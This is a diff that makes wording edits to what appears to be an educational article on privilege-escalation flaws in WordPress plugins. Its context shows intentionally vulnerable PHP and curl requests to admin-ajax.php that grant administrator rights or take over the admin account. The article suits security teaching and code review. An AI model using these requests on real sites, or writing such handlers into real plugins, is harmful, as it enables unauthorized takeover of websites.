@@ -47,14 +47,14 @@ function update_site_preference(){
 }
 ```
 
-To exploit this, any unauthenticated user just needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `update_option` function.
+To exploit this, any unauthenticated user needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `update_option` function.
 
 ```bash
 curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=update_site_preference -d "key=users_can_register&value=1"
 curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=update_site_preference -d "key=default_role&value=administrator"
 ``` 
 
-After that, the user could just simply go to `<WORDPRESS_BASE_URL>`/wp-login.php?action=register and register an account with an administrator role.
+After that, the user can go to `<WORDPRESS_BASE_URL>`/wp-login.php?action=register and register an account with an administrator role.
 
 Below are some of the findings related to Arbitrary Option Update:
 
@@ -88,7 +88,7 @@ function change_user_bio(){
 }
 ```
 
-To exploit this, any authenticated user just needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `update_user_meta` function.
+To exploit this, any authenticated user needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `update_user_meta` function.
 
 ```bash
 curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=change_user_bio -d "key=wp_capabilities&value[administrator]=1" -H 'Cookie: <AUTHENTICATED_USER_COOKIE>'
@@ -127,7 +127,7 @@ function open_registration(){
 }
 ```
 
-To exploit this, any unauthenticated user just needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `wp_insert_user` function.
+To exploit this, any unauthenticated user needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `wp_insert_user` function.
 
 ```bash
 curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=open_registration -d "reg_name=pwned&reg_password=pwned123&reg_email=pwned@mail.com&reg_fname=pwned&reg_lname=pwned&reg_role=administrator"
@@ -167,7 +167,7 @@ function custom_update_profile(){
 }
 ```
 
-To exploit this, any authenticated user just needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `wp_update_user` function and change their role.
+To exploit this, any authenticated user needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `wp_update_user` function and change their role.
 
 ```bash
 curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=custom_update_profile -d "data[first_name]=test&data[role]=administrator" -H 'Cookie: <AUTHENTICATED_USER_COOKIE>'
@@ -183,7 +183,7 @@ Similar to the custom registration process, many plugins or themes also implemen
 
 One of the ways to reset a user's password is through a [`reset_password`](https://developer.wordpress.org/reference/functions/reset_password/) function. This function accepts the `$user` parameter as the targeted user object and the `$new_pass` parameter as the new password value for the user.
 
-The function itself is just a wrapper to another function [`wp_set_password`](https://developer.wordpress.org/reference/functions/wp_set_password/) which is the core function to set the new password for the user. This function accepts the `$user_id` parameter as the targeted user ID and the `$password` parameter as the new password value for the user.
+The function itself is a wrapper to another function [`wp_set_password`](https://developer.wordpress.org/reference/functions/wp_set_password/) which is the core function to set the new password for the user. This function accepts the `$user_id` parameter as the targeted user ID and the `$password` parameter as the new password value for the user.
 
 Example of vulnerable code:
 
@@ -197,7 +197,7 @@ function reset_your_password(){
 }
 ```
 
-To exploit this, unauthenticated users just need to craft and serve a malicious HTML file and trick privileged users into visiting the HTML file to do a reset password action with an attacker-controlled password value.
+To exploit this, unauthenticated users need to craft and serve a malicious HTML file and trick privileged users into visiting the HTML file to do a reset password action with an attacker-controlled password value.
 
 
 ```html
@@ -264,7 +264,7 @@ function login_third_party(){
 }
 ```
 
-To exploit this, any unauthenticated user just needs to perform a POST and GET request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `configure_platform_callback` function and then the `login_third_party` function.
+To exploit this, any unauthenticated user needs to perform a POST and GET request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `configure_platform_callback` function and then the `login_third_party` function.
 
 ```bash
 curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=configure_platform_callback -d "user_id=1&fbid=1337"
@@ -294,7 +294,7 @@ So we can supply a user ID or a username like the following.
 wp_set_current_user( 1 );  // Set current user to the admin (ID = 1)
 wp_set_current_user( 'admin' );  // Set current user to 'admin' by username
 ```
-Well unlike [`wp_set_auth_cookie`](https://developer.wordpress.org/reference/functions/wp_set_auth_cookie/) , [`wp_set_current_user()`](https://developer.wordpress.org/reference/functions/wp_set_current_user/) doesn't log the user in. It just sets the global user variables. The only way for an attacker to log in to an account is if it is supported by `wp_set_auth_cookies` and a `wp_login` action calls.
+Well unlike [`wp_set_auth_cookie`](https://developer.wordpress.org/reference/functions/wp_set_auth_cookie/) , [`wp_set_current_user()`](https://developer.wordpress.org/reference/functions/wp_set_current_user/) doesn't log the user in. It sets the global user variables. The only way for an attacker to log in to an account is if it is supported by `wp_set_auth_cookies` and a `wp_login` action calls.
 
 ```php
 $user_id = $_GET['user_id'];
